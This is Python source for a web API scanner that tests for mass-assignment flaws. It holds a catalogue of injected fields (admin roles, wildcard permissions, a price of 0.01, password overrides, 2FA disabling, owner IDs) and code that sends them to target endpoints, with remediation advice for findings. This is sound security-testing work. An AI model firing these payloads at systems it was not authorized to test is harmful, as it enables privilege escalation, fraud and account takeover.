"""
BEATRIX Mass Assignment / Broken Object Level Authorization Scanner

Born from: OWASP API Security Top 10 (API3:2023 - Broken Object Property Level Authorization)
Previously known as: Mass Assignment / Auto-binding / Object Injection

TECHNIQUE:
1. Identify API endpoints that accept JSON/form data
2. Probe for hidden/undocumented properties by adding extra fields
3. Test privilege escalation via role/admin/isAdmin fields
4. Test field-level access control (can regular user modify restricted fields?)
5. Test object property injection via nested objects and arrays

Attack Surface:
- REST APIs with JSON request bodies
- GraphQL mutations with extra fields
- Form submissions with additional hidden fields
- PUT/PATCH endpoints that merge user input into models

SEVERITY: HIGH-CRITICAL — mass assignment bypasses all business logic validation:
- Privilege escalation: {"role": "admin"} or {"isAdmin": true}
- Price manipulation: {"price": 0.01} on order objects
- Account takeover: {"email": "attacker@evil.com"} on profile update
- Feature unlock: {"isPremium": true}, {"verified": true}
- Bypass verification: {"email_verified": true}

OWASP: API3:2023 - Broken Object Property Level Authorization
       A01:2021 - Broken Access Control
       A04:2021 - Insecure Design

MITRE: T1078 (Valid Accounts), T1190 (Exploit Public-Facing Application)

CWE: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
     CWE-639 (Authorization Bypass Through User-Controlled Key)

REFERENCES:
- https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- https://portswigger.net/web-security/api-testing#mass-assignment
"""

import asyncio
import copy
import json
import random
import re
import string
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, AsyncIterator, Dict, List, Optional, Set

try:
    import httpx
except ImportError:
    httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class MassAssignCategory(Enum):
    """Categories of mass assignment attacks"""
    PRIVILEGE_ESCALATION = auto()  # role, isAdmin, permissions
    FINANCIAL = auto()             # price, balance, credits
    ACCOUNT_TAKEOVER = auto()      # email, password, verified
    FEATURE_UNLOCK = auto()        # isPremium, tier, plan
    STATUS_MANIPULATION = auto()   # status, approved, active
    RELATIONSHIP = auto()          # org_id, team_id, owner_id
    METADATA = auto()              # created_at, updated_at, internal


@dataclass
class MassAssignPayload:
    """A mass assignment test payload"""
    name: str
    field_name: str
    field_value: Any
    category: MassAssignCategory
    severity: Severity
    description: str
    alternatives: List[str] = field(default_factory=list)  # Alternative field names


# =============================================================================
# PAYLOAD DATABASE
# =============================================================================

# Comprehensive list of fields commonly vulnerable to mass assignment
# Organized by attack category
MASS_ASSIGN_PAYLOADS = [
    # ---- PRIVILEGE ESCALATION ----
    MassAssignPayload("Admin flag (bool)", "isAdmin", True,
        MassAssignCategory.PRIVILEGE_ESCALATION, Severity.CRITICAL,
        "Boolean admin flag",
        ["is_admin", "admin", "isadmin", "is_superuser", "isSuperuser",
         "is_staff", "isStaff", "superuser", "su"]),

    MassAssignPayload("Role field (string)", "role", "admin",
        MassAssignCategory.PRIVILEGE_ESCALATION, Severity.CRITICAL,
        "String role assignment",
        ["user_role", "userRole", "user_type", "userType", "type",
         "access_level", "accessLevel", "permission_level", "role_id",
         "roleId", "account_type", "accountType"]),

    MassAssignPayload("Role ID (numeric)", "role_id", 1,
        MassAssignCategory.PRIVILEGE_ESCALATION, Severity.CRITICAL,
        "Numeric role ID (1 often = admin)",
        ["roleId", "role", "group_id", "groupId", "access_level_id"]),

    MassAssignPayload("Permissions array", "permissions", ["*", "admin:*"],
        MassAssignCategory.PRIVILEGE_ESCALATION, Severity.CRITICAL,
        "Wildcard permissions array",
        ["scopes", "privileges", "grants", "access", "claims"]),

    MassAssignPayload("Groups array", "groups", ["administrators"],
        MassAssignCategory.PRIVILEGE_ESCALATION, Severity.CRITICAL,
        "Group membership injection",
        ["teams", "roles", "organizations"]),

    # ---- FINANCIAL ----
    MassAssignPayload("Price override", "price", 0.01,
        MassAssignCategory.FINANCIAL, Severity.CRITICAL,
        "Override item/order price",
        ["unit_price", "unitPrice", "amount", "total", "subtotal",
         "cost", "fee", "rate"]),

    MassAssignPayload("Balance injection", "balance", 999999,
        MassAssignCategory.FINANCIAL, Severity.CRITICAL,
        "Override account balance",
        ["credits", "points", "coins", "tokens", "wallet_balance",
         "walletBalance", "account_balance"]),

    MassAssignPayload("Discount override", "discount", 100,
        MassAssignCategory.FINANCIAL, Severity.HIGH,
        "Override discount percentage",
        ["discount_percent", "discountPercent", "discount_amount",
         "coupon_value", "couponValue"]),

    MassAssignPayload("Free shipping", "free_shipping", True,
        MassAssignCategory.FINANCIAL, Severity.HIGH,
        "Force free shipping flag",
        ["freeShipping", "shipping_cost", "shippingCost",
         "shipping_fee", "shippingFee"]),

    # ---- ACCOUNT TAKEOVER ----
    MassAssignPayload("Email override", "email", "attacker@test.com",
        MassAssignCategory.ACCOUNT_TAKEOVER, Severity.HIGH,
        "Override account email",
        ["user_email", "userEmail", "primary_email", "contact_email"]),

    MassAssignPayload("Email verified flag", "email_verified", True,
        MassAssignCategory.ACCOUNT_TAKEOVER, Severity.HIGH,
        "Bypass email verification",
        ["emailVerified", "verified", "is_verified", "isVerified",
         "confirmed", "email_confirmed", "emailConfirmed"]),

    MassAssignPayload("Password field", "password", "Hacked123!",
        MassAssignCategory.ACCOUNT_TAKEOVER, Severity.CRITICAL,
        "Override password without current password check",
        ["password_hash", "passwordHash", "hashed_password", "pwd",
         "pass", "new_password", "newPassword"]),

    MassAssignPayload("2FA bypass", "two_factor_enabled", False,
        MassAssignCategory.ACCOUNT_TAKEOVER, Severity.CRITICAL,
        "Disable two-factor authentication",
        ["twoFactorEnabled", "mfa_enabled", "mfaEnabled", "otp_enabled",
         "require_2fa", "require2fa"]),

    MassAssignPayload("API key injection", "api_key", "attacker-key",
        MassAssignCategory.ACCOUNT_TAKEOVER, Severity.HIGH,
        "Override or create API key",
        ["apiKey", "api_token", "apiToken", "access_token", "secret"]),

    # ---- FEATURE UNLOCK ----
    MassAssignPayload("Premium flag", "isPremium", True,
        MassAssignCategory.FEATURE_UNLOCK, Severity.HIGH,
        "Unlock premium features",
        ["is_premium", "premium", "is_pro", "isPro", "pro",
         "tier", "plan", "subscription_tier"]),

    MassAssignPayload("Plan override", "plan", "enterprise",
        MassAssignCategory.FEATURE_UNLOCK, Severity.HIGH,
        "Override subscription plan",
        ["subscription", "subscription_plan", "subscriptionPlan",
         "tier", "product_tier", "license_type"]),

    MassAssignPayload("Trial bypass", "trial_ends_at", "2099-12-31",
        MassAssignCategory.FEATURE_UNLOCK, Severity.MEDIUM,
        "Extend trial period",
        ["trialEndsAt", "trial_end", "trialEnd", "trial_expiry",
         "expires_at", "expiresAt"]),

    MassAssignPayload("Feature flags", "features", {"unlimited": True},
        MassAssignCategory.FEATURE_UNLOCK, Severity.MEDIUM,
        "Inject feature flags",
        ["feature_flags", "featureFlags", "flags", "capabilities"]),

    # ---- STATUS MANIPULATION ----
    MassAssignPayload("Approval status", "approved", True,
        MassAssignCategory.STATUS_MANIPULATION, Severity.HIGH,
        "Self-approve pending item",
        ["is_approved", "isApproved", "status", "review_status",
         "moderation_status"]),

    MassAssignPayload("Active status", "active", True,
        MassAssignCategory.STATUS_MANIPULATION, Severity.MEDIUM,
        "Activate suspended/banned account",
        ["is_active", "isActive", "enabled", "is_enabled",
         "banned", "suspended"]),

    MassAssignPayload("Published status", "published", True,
        MassAssignCategory.STATUS_MANIPULATION, Severity.MEDIUM,
        "Publish unpublished content",
        ["is_published", "isPublished", "public", "is_public",
         "visibility", "draft"]),

    # ---- RELATIONSHIP ----
    MassAssignPayload("Organization ID", "org_id", 1,
        MassAssignCategory.RELATIONSHIP, Severity.HIGH,
        "Change organization membership",
        ["orgId", "organization_id", "organizationId", "tenant_id",
         "tenantId", "company_id", "companyId"]),

    MassAssignPayload("Owner override", "owner_id", 1,
        MassAssignCategory.RELATIONSHIP, Severity.HIGH,
        "Change resource ownership",
        ["ownerId", "user_id", "userId", "created_by", "createdBy",
         "author_id", "authorId"]),

    # ---- METADATA ----
    MassAssignPayload("ID override", "id", 1,
        MassAssignCategory.METADATA, Severity.MEDIUM,
        "Override object ID (could collide with existing)",
        ["_id", "pk", "uuid"]),

    MassAssignPayload("Created timestamp", "created_at", "2020-01-01T00:00:00Z",
        MassAssignCategory.METADATA, Severity.LOW,
        "Override creation timestamp",
        ["createdAt", "created", "date_created", "dateCreated"]),

    MassAssignPayload("Internal flag", "__internal", True,
        MassAssignCategory.METADATA, Severity.MEDIUM,
        "Access internal/debug mode",
        ["_internal", "debug", "is_debug", "isDebug", "__debug__",
         "test_mode", "testMode"]),
]


# =============================================================================
# SCANNER
# =============================================================================

class MassAssignmentScanner(BaseScanner):
    """
    Mass Assignment / Broken Object Property Level Authorization scanner.

    Tests API endpoints for improper handling of extra request properties.
    If an API accepts JSON or form data, this scanner adds additional
    fields designed to escalate privileges, manipulate prices, or
    take over accounts.

    Strategy:
    1. Send a baseline request to get the normal response
    2. Add one extra field at a time and compare responses
    3. If the extra field is reflected in the response → confirmed
    4. If the response changes status/content → investigate further
    """

    name = "mass_assignment"
    description = "Mass Assignment / BOPLA Scanner (API3:2023)"
    version = "1.0.0"
    author = "BEATRIX"

    owasp_category = "API3:2023"
    mitre_technique = "T1078"

    checks = [
        "Privilege escalation via role/admin fields",
        "Price/balance manipulation",
        "Account takeover via email/password fields",
        "Feature/plan unlock",
        "Status manipulation (approval, activation)",
        "Relationship/ownership manipulation",
        "Internal/metadata field injection",
    ]

    def __init__(self, config: Optional[Dict] = None):
        super().__init__(config)
        self.test_all_alternatives = self.config.get("test_all_alternatives", False)
        self.categories_to_test = self.config.get("categories", None)  # None = all
        self.max_payloads = self.config.get("max_payloads", 50)

    # =========================================================================
    # MAIN SCAN
    # =========================================================================

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Test for mass assignment vulnerabilities.

        For each endpoint, attempts to inject extra fields into
        JSON request bodies to modify sensitive properties.
        """
        self.log(f"Starting Mass Assignment scan on {context.url}")

        # Determine content type
        content_type = context.headers.get("Content-Type", "").lower()
        is_json = "json" in content_type or context.request.body.strip().startswith("{")

        if not is_json and context.request.method == "GET":
            # For GET requests, test via query parameters
            async for finding in self._test_query_params(context):
                yield finding
            return

        # For POST/PUT/PATCH with JSON bodies
        if context.request.method in ("POST", "PUT", "PATCH"):
            async for finding in self._test_json_body(context):
                yield finding

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Passive detection of mass assignment indicators.

        Analyzes API responses for:
        - Fields in response that aren't in request (potential targets)
        - Role/permission fields visible in response
        - Internal fields leaked (created_at, updated_at, internal IDs)
        """
        if context.response is None:
            return

        response_text = ""
        if hasattr(context.response, 'body'):
            response_text = context.response.body
        elif hasattr(context.response, 'text'):
            response_text = context.response.text

        # Try to parse response as JSON
        try:
            response_json = json.loads(response_text)
        except (json.JSONDecodeError, TypeError):
            return

        if not isinstance(response_json, dict):
            return

        # Check for sensitive fields in API response
        response_fields = set(self._flatten_keys(response_json))

        sensitive_response_fields = {
            "role": "Role field exposed in response",
            "isAdmin": "Admin flag exposed",
            "is_admin": "Admin flag exposed",
            "permissions": "Permissions array exposed",
            "password_hash": "Password hash leaked",
            "api_key": "API key leaked",
            "secret": "Secret value leaked",
            "internal_id": "Internal ID exposed",
            "created_by": "Creator ID exposed (potential IDOR)",
            "email_verified": "Verification status exposed",
        }

        for field_name, field_desc in sensitive_response_fields.items():
            if field_name in response_fields:
                yield self.create_finding(
                    title=f"Sensitive Field in API Response: {field_name}",
                    severity=Severity.LOW,
                    confidence=Confidence.FIRM,
                    url=context.url,
                    description=(
                        f"The API response includes the field '{field_name}' "
                        f"({field_desc}).\n\n"
                        f"If this endpoint accepts write operations (POST/PUT/PATCH), "
                        f"the same field may be writable — test for mass assignment."
                    ),
                    evidence=f"Response field: {field_name}",
                    references=[
                        "OWASP API3:2023 - Broken Object Property Level Authorization",
                        "CWE-915",
                    ],
                )

    # =========================================================================
    # JSON BODY TESTING
    # =========================================================================

    async def _test_json_body(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Test mass assignment via JSON request body.

        Strategy:
        1. Parse the original request body as JSON
        2. Add one extra field at a time
        3. Send the modified request
        4. Check if the field was accepted (appears in response, different status, etc.)
        """
        try:
            original_body = json.loads(context.request.body)
        except (json.JSONDecodeError, TypeError):
            self.log("  Cannot parse request body as JSON")
            return

        if not isinstance(original_body, dict):
            return

        # Get baseline response
        try:
            baseline = await self.post(
                context.url,
                json=original_body,
                headers={"Content-Type": "application/json"},
            )
            baseline_data = self._parse_response(baseline)
        except Exception as e:
            self.log(f"  Baseline request failed: {e}")
            return

        # Filter payloads by category if configured
        payloads = MASS_ASSIGN_PAYLOADS
        if self.categories_to_test:
            payloads = [p for p in payloads if p.category.name in self.categories_to_test]

        # Limit total payloads
        payloads = payloads[:self.max_payloads]

        tested = 0
        for payload in payloads:
            # Skip if field already exists in original body
            if payload.field_name in original_body:
                continue

            # Build fields to test (main + alternatives)
            fields_to_test = [payload.field_name]
            if self.test_all_alternatives:
                fields_to_test.extend(payload.alternatives)

            for field_name in fields_to_test:
                if field_name in original_body:
                    continue

                # Build modified body
                modified_body = copy.deepcopy(original_body)
                modified_body[field_name] = payload.field_value

                try:
                    response = await self.post(
                        context.url,
                        json=modified_body,
                        headers={"Content-Type": "application/json"},
                    )

                    # Analyze response
                    finding = self._analyze_mass_assign_response(
                        context, payload, field_name,
                        baseline, response, baseline_data
                    )

                    if finding:
                        yield finding

                    tested += 1
                    await asyncio.sleep(0.5)

                except Exception as e:
                    self.log(f"    Error testing {field_name}: {e}")

                if not self.test_all_alternatives:
                    break

        self.log(f"  Tested {tested} mass assignment payloads")

    async def _test_query_params(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Test mass assignment via query parameters.

        Some frameworks bind query parameters to model attributes,
        even for GET requests.

        IMPORTANT: We must distinguish between the field name appearing
        in the URL-echoed current_url JSON value (SSR state) vs the
        field actually being processed by the server. We use a unique
        canary VALUE and check that it's reflected outside URL contexts.
        """
        # Only test a subset of payloads via query params
        critical_payloads = [p for p in MASS_ASSIGN_PAYLOADS
                           if p.severity == Severity.CRITICAL]

        # Get a baseline response WITHOUT any injected params
        try:
            await self.get(context.url, params=context.parameters)
        except Exception:
            return

        for payload in critical_payloads[:10]:  # Limit for GET requests
            params = dict(context.parameters)

            # Use a UNIQUE canary value instead of the actual payload value.
            # This prevents false positives from common words like "admin",
            # "True", "1" appearing naturally in the page.
            canary_value = "BTRXMA" + "".join(random.choices(string.ascii_lowercase, k=8))
            params[payload.field_name] = canary_value

            try:
                response = await self.get(context.url, params=params)

                if response.status_code == 200:
                    # Check if our UNIQUE canary value appears in the response
                    # This is much more reliable than checking for field_name
                    if canary_value in response.text:
                        # BUT: SSR apps echo the full URL in JSON state objects
                        # (e.g., "current_url": "https://...?isAdmin=BTRXMAxxxxxx")
                        # We need to verify the canary appears OUTSIDE the URL echo.

                        # Count occurrences — if canary only appears in URL-like
                        # contexts, it's not real reflection
                        body = response.text
                        occurrences = [m.start() for m in re.finditer(re.escape(canary_value), body)]

                        real_reflection = False
                        for idx in occurrences:
                            # Get surrounding context
                            ctx_start = max(0, idx - 120)
                            ctx_end = min(len(body), idx + len(canary_value) + 120)
                            context_str = body[ctx_start:ctx_end]

                            # Skip if this is inside a URL/href context
                            url_echo_patterns = [
                                r'["\']https?://[^"\']*' + re.escape(canary_value),
                                r'current_url["\s:]*["\'][^"\']*' + re.escape(canary_value),
                                r'canonical["\s_:]*["\'][^"\']*' + re.escape(canary_value),
                                r'request_uri["\s:]*["\'][^"\']*' + re.escape(canary_value),
                                r'href=["\'"][^"\']*' + re.escape(canary_value),
                                r'[\?&]' + re.escape(payload.field_name) + r'=' + re.escape(canary_value),
                            ]
                            is_url_echo = any(re.search(p, context_str, re.IGNORECASE) for p in url_echo_patterns)

                            if not is_url_echo:
                                real_reflection = True
                                break

                        if real_reflection:
                            yield self.create_finding(
                                title=f"Mass Assignment via Query: {payload.field_name}",
                                severity=payload.severity,
                                confidence=Confidence.TENTATIVE,
                                url=context.url,
                                description=(
                                    f"The query parameter '{payload.field_name}' was "
                                    f"reflected in the response when added to a GET request.\n\n"
                                    f"Category: {payload.category.name}\n"
                                    f"Test value: {payload.field_value}\n\n"
                                    f"**Manual verification required** — confirm the parameter "
                                    f"actually modified the server-side object."
                                ),
                                evidence=f"?{payload.field_name}={canary_value} reflected outside URL context",
                                references=["OWASP API3:2023", "CWE-915"],
                            )

                await asyncio.sleep(0.3)

            except Exception:
                continue

    # =========================================================================
    # RESPONSE ANALYSIS
    # =========================================================================

    def _analyze_mass_assign_response(
        self,
        context: ScanContext,
        payload: MassAssignPayload,
        field_name: str,
        baseline: httpx.Response,
        response: httpx.Response,
        baseline_data: Optional[Dict],
    ) -> Optional[Finding]:
        """
        Analyze response to determine if mass assignment succeeded.

        Indicators of success:
        1. STRONG: Field appears in response JSON with our value
        2. MODERATE: Response status/content changed significantly
        3. WEAK: No error returned (field wasn't rejected)
        """
        if response.status_code >= 500:
            # Server error — might indicate the field caused issues
            return None

        # Parse response JSON
        response_data = self._parse_response(response)

        # Check 1: Field reflected in response with our value
        if response_data and isinstance(response_data, dict):
            flat_response = self._flatten_dict(response_data)

            for key, value in flat_response.items():
                if field_name in key:
                    # Our field appears in the response!
                    str_value = str(value).lower()
                    str_payload = str(payload.field_value).lower()

                    if str_value == str_payload or str_payload in str_value:
                        return self.create_finding(
                            title=f"Mass Assignment CONFIRMED: {field_name}={payload.field_value}",
                            severity=payload.severity,
                            confidence=Confidence.CERTAIN,
                            url=context.url,
                            description=(
                                f"**CONFIRMED Mass Assignment ({payload.category.name})**\n\n"
                                f"The field '{field_name}' was accepted and reflected in "
                                f"the API response with value '{value}'.\n\n"
                                f"**Attack:** {payload.description}\n\n"
                                f"**Impact:** {self._get_category_impact(payload.category)}"
                            ),
                            evidence=(
                                f"Injected: {field_name}={payload.field_value}\n"
                                f"Response: {key}={value}"
                            ),
                            request=(
                                f"{context.request.method} {context.url}\n"
                                f"Content-Type: application/json\n\n"
                                f'{{\n  ...original fields...,\n  "{field_name}": {json.dumps(payload.field_value)}\n}}'
                            ),
                            remediation=(
                                "1. Use an allowlist of fields that can be mass-assigned\n"
                                "2. Never bind request data directly to model attributes\n"
                                "3. Use DTOs (Data Transfer Objects) with explicit field mapping\n"
                                "4. Implement role-based field access control\n"
                                "5. Framework-specific fixes:\n"
                                "   - Rails: strong_parameters (params.require(:user).permit(:name, :email))\n"
                                "   - Django: serializer fields (fields = ['name', 'email'])\n"
                                "   - Spring: @JsonIgnoreProperties or DTOs\n"
                                "   - Express: pick/omit allowed fields from req.body"
                            ),
                            references=[
                                "OWASP API3:2023",
                                "CWE-915",
                                "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
                            ],
                        )

        # Check 2: Response changed significantly
        if response.status_code != baseline.status_code:
            if response.status_code == 200 and baseline.status_code != 200:
                return self.create_finding(
                    title=f"Potential Mass Assignment: {field_name} changed response status",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.TENTATIVE,
                    url=context.url,
                    description=(
                        f"Adding field '{field_name}' changed the response status "
                        f"from {baseline.status_code} to {response.status_code}.\n\n"
                        f"This suggests the server processed the field. Manual "
                        f"verification required."
                    ),
                    evidence=(
                        f"Baseline: HTTP {baseline.status_code}\n"
                        f"With {field_name}: HTTP {response.status_code}"
                    ),
                    references=["OWASP API3:2023", "CWE-915"],
                )

        return None

    # =========================================================================
    # HELPERS
    # =========================================================================

    def _parse_response(self, response: httpx.Response) -> Optional[Dict]:
        """Try to parse response as JSON"""
        try:
            return response.json()
        except (json.JSONDecodeError, TypeError):
            return None

    def _flatten_keys(self, obj: Any, prefix: str = "") -> Set[str]:
        """Flatten a nested dict/list into a set of dot-notation keys"""
        keys = set()
        if isinstance(obj, dict):
            for k, v in obj.items():
                full_key = f"{prefix}.{k}" if prefix else k
                keys.add(full_key)
                keys.add(k)  # Also add the leaf key
                keys.update(self._flatten_keys(v, full_key))
        elif isinstance(obj, list):
            for item in obj:
                keys.update(self._flatten_keys(item, prefix))
        return keys

    def _flatten_dict(self, obj: Any, prefix: str = "") -> Dict[str, Any]:
        """Flatten a nested dict into dot-notation key-value pairs"""
        items = {}
        if isinstance(obj, dict):
            for k, v in obj.items():
                full_key = f"{prefix}.{k}" if prefix else k
                if isinstance(v, (dict, list)):
                    items.update(self._flatten_dict(v, full_key))
                else:
                    items[full_key] = v
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                items.update(self._flatten_dict(item, f"{prefix}[{i}]"))
        return items

    def _get_category_impact(self, category: MassAssignCategory) -> str:
        """Get impact description for a category"""
        impacts = {
            MassAssignCategory.PRIVILEGE_ESCALATION: (
                "An attacker can escalate their privileges to administrator level, "
                "gaining full control over the application."
            ),
            MassAssignCategory.FINANCIAL: (
                "An attacker can manipulate prices, balances, or financial data, "
                "leading to direct financial loss."
            ),
            MassAssignCategory.ACCOUNT_TAKEOVER: (
                "An attacker can take over any user account by modifying "
                "email, password, or verification status."
            ),
            MassAssignCategory.FEATURE_UNLOCK: (
                "An attacker can unlock premium features or extend trials "
                "without payment, causing revenue loss."
            ),
            MassAssignCategory.STATUS_MANIPULATION: (
                "An attacker can self-approve content, bypass moderation, "
                "or reactivate banned accounts."
            ),
            MassAssignCategory.RELATIONSHIP: (
                "An attacker can change organizational membership or resource "
                "ownership, accessing other tenants' data."
            ),
            MassAssignCategory.METADATA: (
                "An attacker can modify internal metadata, potentially "
                "colliding with existing records or enabling debug features."
            ),
        }
        return impacts.get(category, "Impact varies by context.")
